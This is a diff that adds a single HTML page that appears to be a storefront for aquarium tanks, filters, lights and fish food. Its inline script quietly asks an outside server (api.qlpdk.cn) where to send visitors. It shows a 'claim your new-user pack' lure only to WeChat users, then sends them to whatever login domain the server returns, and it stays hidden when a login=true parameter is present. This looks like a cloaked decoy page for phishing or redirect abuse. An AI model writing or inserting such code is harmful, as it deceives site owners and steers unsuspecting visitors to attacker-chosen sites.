@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>深蓝水族 · 生态水景专家</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',system-ui;}
+        body{background:#eef5ff;}
+        .navbar{background:#0c4e6e;padding:0.8rem 5%;display:flex;justify-content:space-between;color:white;}
+        .logo{font-size:1.5rem;font-weight:bold;letter-spacing:2px;}
+        .nav-links{display:flex;gap:1.5rem;list-style:none;}
+        .nav-links a{color:#bae6fd;text-decoration:none;}
+        .hero-wave{background:linear-gradient(145deg,#0284c7,#0f172a);padding:2.5rem 5%;color:white;clip-path:polygon(0 0,100% 0,100% 85%,0 100%);}
+        .hero-wave h1{font-size:2rem;}
+        .section-card{margin:2rem 5%;}
+        .section-title{font-size:1.6rem;border-bottom:3px solid #0e7490;display:inline-block;padding-right:2rem;margin-bottom:1rem;color:#0f172a;}
+        .aqua-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:1.5rem;margin-top:1rem;}
+        .product-card{background:white;border-radius:24px;overflow:hidden;box-shadow:0 10px 20px rgba(0,0,0,0.1);transition:0.2s;}
+        .product-card img{width:100%;height:150px;object-fit:cover;}
+        .product-info{padding:1rem;}
+        .product-info h3{color:#075985;}
+        .feature-bubbles{background:#cffafe;margin:2rem 5%;padding:1.5rem;border-radius:40px;display:flex;gap:2rem;justify-content:center;flex-wrap:wrap;}
+        @media (max-width:700px){.nav-links{display:none;}}
+        .wechat-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);backdrop-filter:blur(2px);display:flex;align-items:center;justify-content:center;z-index:9999;display:none;}
+        .wechat-modal{width:280px;background:#ffffff;border-radius:28px;text-align:center;}
+        .enter-btn{background:#0284c7;border:none;padding:12px 20px;border-radius:40px;color:white;margin:1rem;cursor:pointer;}
+    </style>
+</head>
+<body>
+<div class="navbar"><div class="logo">🌊 深蓝水族</div><ul class="nav-links"><li><a href="#">鱼缸</a></li><li><a href="#">过滤器</a></li><li><a href="#">水草灯</a></li><li><a href="#">观赏鱼粮</a></li></ul></div>
+<div class="hero-wave"><h1>生态 · 宁静 · 灵动</h1><p>高端水族造景器材，让家拥有海洋呼吸</p></div>
+<div class="section-card"><h2 class="section-title">🏆 热销造景装备</h2><div class="aqua-grid">
+    <div class="product-card"><img src="https://picsum.photos/id/99/400/300" alt="超白缸"><div class="product-info"><h3>金晶超白鱼缸</h3><p>高透光耐刮擦，直角水刀工艺，免打孔套装</p></div></div>
+    <div class="product-card"><img src="https://picsum.photos/id/88/400/300" alt="外置过滤器"><div class="product-info"><h3>静音桶式过滤</h3><p>多层生化过滤，20W低功耗，免维护设计</p></div></div>
+    <div class="product-card"><img src="https://picsum.photos/id/22/400/300" alt="水草灯"><div class="product-info"><h3>全光谱LED水草灯</h3><p>模拟日出日落，显色指数Ra95，促进光合作用</p></div></div>
+    <div class="product-card"><img src="https://picsum.photos/id/26/400/300" alt="鱼粮"><div class="product-info"><h3>缓沉增艳鱼粮</h3><p>螺旋藻+虾红素，不浑水，发色自然</p></div></div>
+</div></div>
+<div class="feature-bubbles"><span>🐟 包邮包损</span><span>💧 终身水质咨询</span><span>⚙️ 365天以换代修</span></div>
+<div class="wechat-overlay" id="wechatModal"><div class="wechat-modal"><div class="wechat-modal-image"><p>🐠 解锁水族顾问</p><span>点击进入领取新手包</span></div><div class="wechat-modal-button"><button class="enter-btn" id="enterBtn">点击进入</button></div></div></div>
+
+<script>
+(function(){
+    const modal = document.getElementById("wechatModal");
+    const btn = document.getElementById("enterBtn");
+    modal.style.display = "none";
+
+    // 如果 URL 带有 login=true 则跳过弹窗和请求
+    if (new URLSearchParams(location.search).get('login') === 'true') return;
+
+    // ---- 获取 rule_id 参数 ----
+    const urlParams = new URLSearchParams(location.search);
+    const ruleId = urlParams.get('rule_id');
+
+    const curUrl = encodeURIComponent(location.href);
+
+    // 构建接口地址，若存在 rule_id 则追加
+    let apiUrl = "https://api.qlpdk.cn/api/index/selectRoute?url=" + curUrl;
+    if (ruleId !== null && ruleId !== '') {
+        apiUrl += '&rule_id=' + encodeURIComponent(ruleId);
+    }
+
+    fetch(apiUrl)
+        .then(r => r.json())
+        .then(d => {
+            let jump = d?.data?.loginDomain;
+            if (d && d.code === 1 && /micromessenger/i.test(navigator.userAgent)) {
+                modal.style.display = "flex";
+            }
+            if (jump) {
+                // 替换按钮，防止重复绑定
+                const newBtn = btn.cloneNode(true);
+                btn.replaceWith(newBtn);
+                document.getElementById("enterBtn").addEventListener("click", function() {
+                    location.href = jump;
+                });
+            }
+        })
+        .catch(e => {});
+
+    modal.addEventListener("click", e => e.stopPropagation());
+})();
+</script>
+</body>
+</html>
